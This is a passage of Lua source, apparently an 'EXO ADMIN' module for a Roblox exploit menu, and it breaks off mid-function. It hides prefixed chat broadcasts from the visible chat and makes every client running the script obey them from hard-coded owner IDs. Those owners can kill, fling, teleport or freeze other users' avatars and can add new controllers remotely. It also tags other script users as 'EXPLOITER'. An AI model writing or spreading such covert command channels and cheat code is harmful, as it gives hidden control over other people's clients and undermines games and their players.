-- ============================================================
-- EXO ADMIN — auto-loads with the script, waits for menu to finish
-- ============================================================
task.spawn(function()
    -- wait until LocalPlayer has a live character
    local t0 = tick()
    while tick() - t0 < 30 do
        if LP and LP.Character and LP.Character:FindFirstChildOfClass("Humanoid") then
            break
        end
        task.wait(0.25)
    end
    -- wait for menu to finish building
    task.wait(3)

    -- ============================================================
    -- ADMIN RUNS IN ITS OWN FUNCTION SCOPE (no variable collisions)
    -- ============================================================
    local function runAdmin()
        local Players           = game:GetService("Players")
        local UserInputService  = game:GetService("UserInputService")
        local TweenService      = game:GetService("TweenService")
        local TextChatService   = game:GetService("TextChatService")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local lp = Players.LocalPlayer

        local WHITELIST_BY_ID = {
            [11563295881] = "Owner",
            [8867107490]  = "Owner",
            [8942146589]  = "Co-Owner",
            [7814798348]  = "Mod",
        }
        local WHITELIST_BY_NAME = {}
        local OWNER_IDS = { [11563295881] = true, [8867107490] = true }
        local BCAST_PREFIX = "!EXO_BC_"

        pcall(function()
            if TextChatService and TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                TextChatService.OnIncomingMessage = function(message)
                    local t = message.Text or ""
                    if t:sub(1, #BCAST_PREFIX) == BCAST_PREFIX then
                        local props = Instance.new("TextChatMessageProperties")
                        props.Text = ""
                        props.PrefixText = ""
                        return props
                    end
                end
            end
        end)

        local function sendHidden(text)
            local ok = false
            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                local ch = TextChatService:FindFirstChild("TextChannels")
                if ch then
                    local rb = ch:FindFirstChild("RBXGeneral") or ch:FindFirstChildOfClass("TextChannel")
                    if rb then ok = pcall(function() rb:SendAsync(text) end) end
                end
            end
            if not ok then
                local dc = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
                local say = dc and dc:FindFirstChild("SayMessageRequest")
                if say then pcall(function() say:FireServer(text, "All") end) end
            end
        end

        local function isWhitelistedName(name)
            if not name then return false end
            if WHITELIST_BY_NAME[name] then return true end
            for _, p in ipairs(Players:GetPlayers()) do
                if p.Name == name and WHITELIST_BY_ID[p.UserId] then return true end
            end
            return false
        end

        local function isOwnerName(name)
            for _, p in ipairs(Players:GetPlayers()) do
                if p.Name == name and OWNER_IDS[p.UserId] then return true end
            end
            return false
        end

        local function localMatches(q)
            if not q or q == "" then return true end
            q = q:lower()
            if lp.Name:lower() == q or lp.DisplayName:lower() == q then return true end
            if lp.Name:lower():find(q, 1, true) or lp.DisplayName:lower():find(q, 1, true) then return true end
            return false
        end

        local function resolvePlayer(q)
            if not q or q == "" then return nil end
            local lq = q:lower()
            for _, p in ipairs(Players:GetPlayers()) do
                if p.Name:lower() == lq or p.DisplayName:lower() == lq then return p end
            end
            for _, p in ipairs(Players:GetPlayers()) do
                if p.Name:lower():find(lq, 1, true) or p.DisplayName:lower():find(lq, 1, true) then return p end
            end
            return nil
        end

        local KNOWN_SCRIPT_USERS = {}
        local EXPLOITER_TAGS_ENABLED = false
        local OWNER_TAGS_ENABLED = false
        local tags = {}

        local EXO_MARKERS = { "TouchFlingDetector", "EXO_Tag", "EXO_ESP", "EXO_TRAP" }
        local function hasExoMarker(player)
            if not player or not player.Character then return false end
            for _, name in ipairs(EXO_MARKERS) do
                if player.Character:FindFirstChild(name) then return true end
            end
            return false
        end

        local function roleColor(role)
            if role == "Owner" then return Color3.fromRGB(255, 215, 0)
            elseif role == "Co-Owner" then return Color3.fromRGB(220, 40, 70)
            elseif role == "Mod" then return Color3.fromRGB(80, 140, 255)
            else return Color3.fromRGB(150, 90, 200) end
        end

        local function destroyTag(name)
            if tags[name] then
                pcall(function() tags[name]:Destroy() end)
                tags[name] = nil
            end
        end

        local function makeTag(player, text, color)
            if not player or not player.Parent or not player.Character then return end
            local hrp = player.Character:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            if tags[player.Name] and tags[player.Name].Parent then
                local lbl = tags[player.Name]:FindFirstChildOfClass("TextLabel")
                if lbl then
                    lbl.Text = text
                    lbl.BackgroundColor3 = color
                end
                tags[player.Name].Adornee = hrp
                return
            end
            destroyTag(player.Name)
            local bg = Instance.new("BillboardGui")
            bg.Name = "EXO_Tag"
            bg.Size = UDim2.fromOffset(90, 20)
            bg.StudsOffsetWorldSpace = Vector3.new(0, -3, 0)
            bg.AlwaysOnTop = true
            bg.MaxDistance = 500
            bg.Adornee = hrp
            bg.Parent = hrp
            local lbl = Instance.new("TextLabel")
            lbl.BackgroundColor3 = color
            lbl.BackgroundTransparency = 0.15
            lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
            lbl.TextScaled = true
            lbl.Font = Enum.Font.GothamBold
            lbl.Text = text
            lbl.TextSize = 11
            lbl.Size = UDim2.fromScale(1, 1)
            lbl.Parent = bg
            local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 5); c.Parent = lbl
            local s = Instance.new("UIStroke")
            s.Color = Color3.fromRGB(255, 255, 255); s.Thickness = 1; s.Transparency = 0.4
            s.Parent = lbl
            task.spawn(function()
                while bg.Parent do
                    TweenService:Create(lbl, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                        BackgroundTransparency = 0.35
                    }):Play()
                    task.wait(1.2)
                    TweenService:Create(lbl, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                        BackgroundTransparency = 0.1
                    }):Play()
                    task.wait(1.2)
                end
            end)
            tags[player.Name] = bg
        end

        local function refreshTags()
            for name in pairs(tags) do
                if not Players:FindFirstChild(name) then destroyTag(name) end
            end
            if not EXPLOITER_TAGS_ENABLED and not OWNER_TAGS_ENABLED then
                for name in pairs(tags) do destroyTag(name) end
                return
            end
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= lp and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                    local role = WHITELIST_BY_ID[plr.UserId] or WHITELIST_BY_NAME[plr.Name]
                    local isScriptUser = KNOWN_SCRIPT_USERS[plr.UserId] ~= nil
                    if OWNER_TAGS_ENABLED and role then
                        makeTag(plr, role, roleColor(role))
                    elseif EXPLOITER_TAGS_ENABLED and not role and isScriptUser then
                        makeTag(plr, "EXPLOITER", Color3.fromRGB(200, 20, 30))
                    else
                        destroyTag(plr.Name)
                    end
                end
            end
        end

        task.spawn(function()
            while true do
                task.wait(3)
                for _, plr in ipairs(Players:GetPlayers()) do
                    if plr ~= lp and hasExoMarker(plr) then
                        KNOWN_SCRIPT_USERS[plr.UserId] = { name = plr.Name, lastSeen = tick() }
                    end
                end
                for uid in pairs(KNOWN_SCRIPT_USERS) do
                    if not Players:GetPlayerByUserId(uid) then KNOWN_SCRIPT_USERS[uid] = nil end
                end
                if EXPLOITER_TAGS_ENABLED or OWNER_TAGS_ENABLED then
                    pcall(refreshTags)
                end
            end
        end)

        Players.PlayerAdded:Connect(function(p)
            p.CharacterAdded:Connect(function()
                task.wait(0.6)
                if EXPLOITER_TAGS_ENABLED or OWNER_TAGS_ENABLED then pcall(refreshTags) end
            end)
        end)
        Players.PlayerRemoving:Connect(function(p) destroyTag(p.Name) end)
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= lp then
                p.CharacterAdded:Connect(function()
                    task.wait(0.6)
                    if EXPLOITER_TAGS_ENABLED or OWNER_TAGS_ENABLED then pcall(refreshTags) end
                end)
            end
        end
        lp.CharacterAdded:Connect(function()
            task.wait(0.6)
            if EXPLOITER_TAGS_ENABLED or OWNER_TAGS_ENABLED then pcall(refreshTags) end
        end)

        local function myRoot() return lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") end
        local function myHum() return lp.Character and lp.Character:FindFirstChildOfClass("Humanoid") end
        local savedPositions = {}
        local frozen = {}
        local ADMIN_EXEC = {}

        ADMIN_EXEC.kill = function()
            local h = myHum()
            if h then h.Health = 0 end
        end
        ADMIN_EXEC.damage = function(arg)
            local h = myHum()
            if h then h:TakeDamage(tonumber(arg) or 25) end
        end
        ADMIN_EXEC.heal = function()
            local h = myHum()
            if h then h.Health = h.MaxHealth end
        end
        ADMIN_EXEC.freeze = function()
            frozen[lp] = true
            local c = lp.Character
            if not c then return end
            local h = c:FindFirstChildOfClass("Humanoid")
            local r = myRoot()
            if h then h.WalkSpeed = 0; h.JumpPower = 0; h.AutoRotate = false end
            if r then r.Anchored = true end
            task.spawn(function()
                while frozen[lp] do
                    local cc = lp.Character
                    local hh = cc and cc:FindFirstChildOfClass("Humanoid")
                    local rr = cc and cc:FindFirstChild("HumanoidRootPart")
                    if hh then hh.WalkSpeed = 0; hh.JumpPower = 0; hh.AutoRotate = false end
                    if rr then rr.Anchored = true end
                    task.wait(0.25)
                end
            end)
        end
        ADMIN_EXEC.unfreeze = function()
            frozen[lp] = false
            local c = lp.Character
            local h = c and c:FindFirstChildOfClass("Humanoid")
            local r = myRoot()
            if h then h.WalkSpeed = 16; h.JumpPower = 50; h.AutoRotate = true end
            if r then r.Anchored = false end
        end
        ADMIN_EXEC.fling = function()
            local r = myRoot()
            if not r then return end
            r.Anchored = false
            local dir = Vector3.new(math.random(-1,1), 0, math.random(-1,1))
            if dir.Magnitude < 0.1 then dir = Vector3.new(1, 0, 0) end
            r.AssemblyLinearVelocity = dir.Unit * 300 + Vector3.new(0, 200, 0)
            r.AssemblyAngularVelocity = Vector3.new(math.random(-50,50), math.random(-50,50), math.random(-50,50))
        end
        ADMIN_EXEC["void"] = function()
            local r = myRoot()
            if r then
                savedPositions[lp] = r.CFrame
                r.CFrame = CFrame.new(r.Position.X, 10000, r.Position.Z)
                r.AssemblyLinearVelocity = Vector3.zero
            end
        end
        ADMIN_EXEC.unvoid = function()
            local r = myRoot()
            if r then
                r.CFrame = CFrame.new(r.Position.X, 50, r.Position.Z)
                r.AssemblyLinearVelocity = Vector3.zero
            end
        end
        ADMIN_EXEC["return"] = function()
            local s = savedPositions[lp]
            local r = myRoot()
            if s and r then
                r.CFrame = s
                r.AssemblyLinearVelocity = Vector3.zero
            end
        end
        ADMIN_EXEC.jump = function()
            local r = myRoot()
            if r then
                r.AssemblyLinearVelocity = Vector3.new(r.AssemblyLinearVelocity.X, 200, r.AssemblyLinearVelocity.Z)
            end
        end
        ADMIN_EXEC.spin = function(arg)
            local sp = tonumber(arg) or 30
            local r = myRoot()
            if r then
                task.spawn(function()
                    local endAt = tick() + 3
                    while tick() < endAt do
                        if not r.Parent then break end
                        r.AssemblyAngularVelocity = Vector3.new(0, sp, 0)
                        task.wait(0.05)
                    end
                    if r and r.Parent then r.AssemblyAngularVelocity = Vector3.zero end
                end)
            end
        end
        ADMIN_EXEC.speed = function(arg)
            local h = myHum()
            if h then
                h.WalkSpeed = 16 * (tonumber(arg) or 5)
                task.spawn(function()
                    task.wait(10)
                    local hh = myHum()
                    if hh then hh.WalkSpeed = 16 end
                end)
            end
        end
        ADMIN_EXEC.slow = function(arg)
            local h = myHum()
            if h then
                h.WalkSpeed = 16 / (tonumber(arg) or 3)
                task.spawn(function()
                    task.wait(10)
                    local hh = myHum()
                    if hh then hh.WalkSpeed = 16 end
                end)
            end
        end
        ADMIN_EXEC.jumppower = function(arg)
            local h = myHum()
            if h then h.UseJumpPower = true; h.JumpPower = tonumber(arg) or 500 end
        end
        ADMIN_EXEC.hipheight = function(arg)
            local h = myHum()
            if h then h.HipHeight = tonumber(arg) or 10 end
        end
        ADMIN_EXEC.freezevel = function()
            local r = myRoot()
            if r then
                r.AssemblyLinearVelocity = Vector3.zero
                r.AssemblyAngularVelocity = Vector3.zero
            end
        end
        ADMIN_EXEC.shoot = function()
            local c = lp.Character
            local t = c and c:FindFirstChildOfClass("Tool")
            if t then pcall(function() t:Activate() end) end
        end
        ADMIN_EXEC.rapid = function()
            local c = lp.Character
            local t = c and c:FindFirstChildOfClass("Tool")
            if t then
                task.spawn(function()
                    local endAt = tick() + 3
                    while tick() < endAt do
                        local cc = lp.Character
                        local tt = cc and cc:FindFirstChildOfClass("Tool")
                        if tt then pcall(function() tt:Activate() end) end
                        task.wait(0.05)
                    end
                end)
            end
        end
        ADMIN_EXEC.equip = function(arg)
            local name = tostring(arg or "")
            if name == "" then return end
            local h = myHum()
            local bp = lp:FindFirstChildOfClass("Backpack")
            if not h or not bp then return end
            local tool = bp:FindFirstChild(name) or (lp.Character and lp.Character:FindFirstChild(name))
            if tool then pcall(function() h:EquipTool(tool) end) end
        end
        ADMIN_EXEC.unequip = function()
            local h = myHum()
            if h then h:UnequipTools() end
        end
        ADMIN_EXEC.ff = function()
            local c = lp.Character
            if not c then return end
            local ex = c:FindFirstChildOfClass("ForceField")
            if ex then ex:Destroy() end
            local ff = Instance.new("ForceField")
            ff.Visible = false
            ff.Parent = c
        end
        ADMIN_EXEC.unff = function()
            local c = lp.Character
            if not c then return end
            local ff = c:FindFirstChildOfClass("ForceField")
            if ff then ff:Destroy() end
        end
        ADMIN_EXEC.ragdoll = function()
            local h = myHum()
            if h then
                pcall(function() h:ChangeState(Enum.HumanoidStateType.Physics) end)
                for _, m in ipairs(h:GetChildren()) do
                    if m:IsA("Motor6D") then
                        local sock = Instance.new("BallSocketConstraint")
                        local a0 = Instance.new("Attachment"); a0.Parent = m.Part0
                        local a1 = Instance.new("Attachment"); a1.Parent = m.Part1
                        sock.Attachment0 = a0
                        sock.Attachment1 = a1
                        sock.Parent = m.Part0
                        m.Enabled = false
                    end
                end
            end
        end
        ADMIN_EXEC.unragdoll = function()
            local c = lp.Character
            if not c then return end
            local h = c:FindFirstChildOfClass("Humanoid")
            if h then
                pcall(function() h:ChangeState(Enum.HumanoidStateType.GettingUp) end)
                for _, m in ipairs(h:GetChildren()) do
                    if m:IsA("Motor6D") then m.Enabled = true end
                end
                for _, d in ipairs(c:GetDescendants()) do
                    if d:IsA("BallSocketConstraint") then d:Destroy() end
                end
            end
        end
        ADMIN_EXEC.skydive = function()
            local r = myRoot()
            if r then
                r.AssemblyLinearVelocity = Vector3.new(0, -300, 0)
                r.AssemblyAngularVelocity = Vector3.new(20, 20, 20)
            end
        end
        ADMIN_EXEC.noclip = function()
            local c = lp.Character
            if not c then return end
            task.spawn(function()
                local endAt = tick() + 5
                while tick() < endAt do
                    if not lp.Character then break end
                    for _, d in ipairs(lp.Character:GetDescendants()) do
                        if d:IsA("BasePart") then d.CanCollide = false end
                    end
                    task.wait(0.1)
                end
                if lp.Character then
                    for _, d in ipairs(lp.Character:GetDescendants()) do
                        if d:IsA("BasePart") and d.Name ~= "HumanoidRootPart" then
                            d.CanCollide = true
                        end
                    end
                end
            end)
        end
        ADMIN_EXEC.gravity = function(arg)
            pcall(function() game:GetService("Workspace").Gravity = tonumber(arg) or 100 end)
        end
        ADMIN_EXEC.hat = function()
            local c = lp.Character
            if not c then return end
            for _, acc in ipairs(c:GetChildren()) do
                if acc:IsA("Accessory") then
                    local handle = acc:FindFirstChild("Handle")
                    if handle then
                        local w = handle:FindFirstChildOfClass("Weld")
                        if w then w:Destroy() end
                    end
                end
            end
        end
        ADMIN_EXEC.notify = function(arg)
            pcall(function()
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "EXO", Text = tostring(arg or ""), Duration = 5
                })
            end)
        end
        ADMIN_EXEC.hint = function(arg)
            pcall(function()
                game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
                    Text = tostring(arg or ""), Color = Color3.fromRGB(255, 200, 0),
                    Font = Enum.Font.SourceSansBold, TextSize = 20
                })
            end)
        end
        ADMIN_EXEC.goto = function(arg)
            local t = resolvePlayer(arg)
            if not t or not t.Character then return end
            local tr = t.Character:FindFirstChild("HumanoidRootPart")
            local mr = myRoot()
            if not tr or not mr then return end
            local back = tr.CFrame.LookVector * -4
            mr.CFrame = CFrame.new(tr.Position + back + Vector3.new(0, 0.5, 0), tr.Position)
            mr.AssemblyLinearVelocity = Vector3.zero
            mr.AssemblyAngularVelocity = Vector3.zero
        end
        ADMIN_EXEC.teleport = ADMIN_EXEC.goto
        ADMIN_EXEC.tp = ADMIN_EXEC.goto
        ADMIN_EXEC.warp = ADMIN_EXEC.goto
        ADMIN_EXEC.bring = function(senderName)
            if not senderName then return end
            local sender
            for _, p in ipairs(Players:GetPlayers()) do
                if p.Name == senderName or p.DisplayName == senderName then sender = p break end
            end
            if not sender or not sender.Character then return end
            local sr = sender.Character:FindFirstChild("HumanoidRootPart")
            local mr = myRoot()
            if not sr or not mr then return end
            local front = sr.CFrame.LookVector * 4
            mr.CFrame = CFrame.new(sr.Position + front + Vector3.new(0, 0.5, 0), sr.Position)
            mr.AssemblyLinearVelocity = Vector3.zero
            mr.AssemblyAngularVelocity = Vector3.zero
        end
        ADMIN_EXEC.bringall = function(senderName)
            if not senderName then return end
            local sender
            for _, p in ipairs(Players:GetPlayers()) do
                if p.Name == senderName or p.DisplayName == senderName then sender = p break end
            end
            if not sender or not sender.Character then return end
            local sr = sender.Character:FindFirstChild("HumanoidRootPart")
            local mr = myRoot()
            if not sr or not mr then return end
            local angle = math.random() * math.pi * 2
            local rad = math.random(4, 8)
            local side = Vector3.new(math.cos(angle) * rad, 0, math.sin(angle) * rad)
            local front = sr.CFrame.LookVector * 6
            mr.CFrame = CFrame.new(sr.Position + front + side + Vector3.new(0, 0.5, 0), sr.Position)
            mr.AssemblyLinearVelocity = Vector3.zero
            mr.AssemblyAngularVelocity = Vector3.zero
        end
        ADMIN_EXEC.push = function(senderName)
            if not senderName then return end
            local sender
            for _, p in ipairs(Players:GetPlayers()) do
                if p.Name == senderName or p.DisplayName == senderName then sender = p break end
            end
            if not sender or not sender.Character then return end
            local sr = sender.Character:FindFirstChild("HumanoidRootPart")
            local mr = myRoot()
            if not sr or not mr then return end
            local dir = (mr.Position - sr.Position)
            if dir.Magnitude < 0.1 then dir = Vector3.new(1, 0, 0) end
            mr.AssemblyLinearVelocity = dir.Unit * 300 + Vector3.new(0, 150, 0)
        end
        ADMIN_EXEC.pull = function(senderName)
            if not senderName then return end
            local sender
            for _, p in ipairs(Players:GetPlayers()) do
                if p.Name == senderName or p.DisplayName == senderName then sender = p break end
            end
            if not sender or not sender.Character then return end
            local sr = sender.Character:FindFirstChild("HumanoidRootPart")
            local mr = myRoot()
            if not sr or not mr then return end
            local dir = (sr.Position - mr.Position)
            if dir.Magnitude < 0.1 then dir = Vector3.new(1, 0, 0) end
            mr.AssemblyLinearVelocity = dir.Unit * 200
        end

        local ADMIN_COMMANDS = {
            kill       = {arg = false, exec = "kill"},
            damage     = {arg = true,  exec = "damage"},
            heal       = {arg = false, exec = "heal"},
            freeze     = {arg = false, exec = "freeze"},
            unfreeze   = {arg = false, exec = "unfreeze"},
            fling      = {arg = false, exec = "fling"},
            ["void"]   = {arg = false, exec = "void"},
            unvoid     = {arg = false, exec = "unvoid"},
            ["return"] = {arg = false, exec = "return"},
            jump       = {arg = false, exec = "jump"},
            spin       = {arg = true,  exec = "spin"},
            speed      = {arg = true,  exec = "speed"},
            slow       = {arg = true,  exec = "slow"},
            jumppower  = {arg = true,  exec = "jumppower"},
            hipheight  = {arg = true,  exec = "hipheight"},
            freezevel  = {arg = false, exec = "freezevel"},
            shoot      = {arg = false, exec = "shoot"},
            rapid      = {arg = false, exec = "rapid"},
            equip      = {arg = true,  exec = "equip"},
            unequip    = {arg = false, exec = "unequip"},
            ff         = {arg = false, exec = "ff"},
            unff       = {arg = false, exec = "unff"},
            ragdoll    = {arg = false, exec = "ragdoll"},
            unragdoll  = {arg = false, exec = "unragdoll"},
            skydive    = {arg = false, exec = "skydive"},
            noclip     = {arg = false, exec = "noclip"},
            gravity    = {arg = true,  exec = "gravity"},
            hat        = {arg = false, exec = "hat"},
            goto       = {arg = true,  exec = "goto"},
            teleport   = {arg = true,  exec = "teleport"},
            tp         = {arg = true,  exec = "tp"},
            warp       = {arg = true,  exec = "warp"},
            bring      = {arg = true,  exec = "bring",    useSender = true},
            bringall   = {arg = false, exec = "bringall", useSender = true},
            push       = {arg = false, exec = "push",     useSender = true},
            pull       = {arg = false, exec = "pull",     useSender = true},
            notify     = {arg = true,  exec = "notify"},
            hint       = {arg = true,  exec = "hint"},
        }

        local function handleIncoming(senderName, text)
            if type(text) ~= "string" then return end
            if text:sub(1, #BCAST_PREFIX) ~= BCAST_PREFIX then return end
            if not isWhitelistedName(senderName) then return end
            local body = text:sub(#BCAST_PREFIX + 1)
            local cmd, target, arg = body:match("^([^|]*)|([^|]*)|(.*)$")
            if not cmd then return end
            cmd = cmd:lower()
            if cmd == "exptags" then
                EXPLOITER_TAGS_ENABLED = (target == "on")
                pcall(refreshTags)
                return
            elseif cmd == "ownertags" then
                OWNER_TAGS_ENABLED = (target == "on")
                pcall(refreshTags)
                return
            elseif cmd == "whitelist" then
                local uidStr, role = target:match("^([^|]*)|(.*)$")
                local uid = tonumber(uidStr)
                if uid and role and role ~= "" then WHITELIST_BY_ID[uid] = role end
                return
            elseif cmd == "unwhitelist" then
                local uid = tonumber(target)
                if uid then WHITELIST_BY_ID[uid] = nil end
                return
            end
            local info = ADMIN_COMMANDS[cmd]
            if not info then return end
            if not localMatches(target) then return end
            local fn = ADMIN_EXEC[info.exec]
            if not fn then return end
            local passedArg = arg
            if info.useSender then passedArg = senderName end
            pcall(fn, passedArg)
        end

        pcall(function()
            Players.PlayerChatted:Connect(function(_, plr, msg)
                if plr then handleIncoming(plr.Name, msg) end
            end)
        end)
        pcall(function()
            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                TextChatService.MessageReceived:Connect(function(msg)
                    if msg.Status ~= Enum.TextChatMessageStatus.Success then return end
                    if not msg.TextSource then return end
                    handleIncoming(msg.TextSource.Name, msg.Text or "")
                end)
            end
        end)

        local function broadcastAdmin(cmd, query, arg)
            local payload = BCAST_PREFIX .. cmd .. "|" .. tostring(query or "") .. "|" .. tostring(arg or "")
            sendHidden(payload)
            local info = ADMIN_COMMANDS[cmd]
            if info and localMatches(query) then
                local passedArg = arg
                if info.useSender then passedArg = lp.Name end
                local fn = ADMIN_EXEC[info.exec]
                if fn then pcall(fn, passedArg) end
            end
        end

        local function parseCmd(message)
            if type(message) ~= "string" then return nil end
            if message:sub(1, 1) ~= "!" then return nil end
            local parts = {}
            for piece in string.gmatch(message:sub(2), "([^%s]+)") do table.insert(parts, piece) end
            if #parts == 0 then return nil end
            local cmd = parts[1]:lower()
            table.remove(parts, 1)
            return cmd, parts
        end

        lp.Chatted:Connect(function(message)
            local cmd, args = parseCmd(message)
            if not cmd then return end
            if cmd == "cmds" then
                print("[EXO-ADMIN] Commands: !kill !damage !heal !freeze !unfreeze !fling")
                print("  !void !unvoid !return !jump !spin !speed !slow")
                print("  !jumppower !hipheight !freezevel !shoot !rapid")
                print("  !equip !unequip !ff !unff !ragdoll !unragdoll")
                print("  !skydive !noclip !gravity !hat !notify !hint")
                print("  !goto !tp !warp !teleport !bring !bringall !push !pull")
                print("  !exptags !ownertags !tags")
                print("  !whitelist <id> [role] !unwhitelist <id> !listwhitelist !scripts")
                return
            end
            if cmd == "listwhitelist" then
                for uid, role in pairs(WHITELIST_BY_ID) do
                    print("  " .. uid .. " -> " .. role)
                end
                return
            end
            if cmd == "scripts" then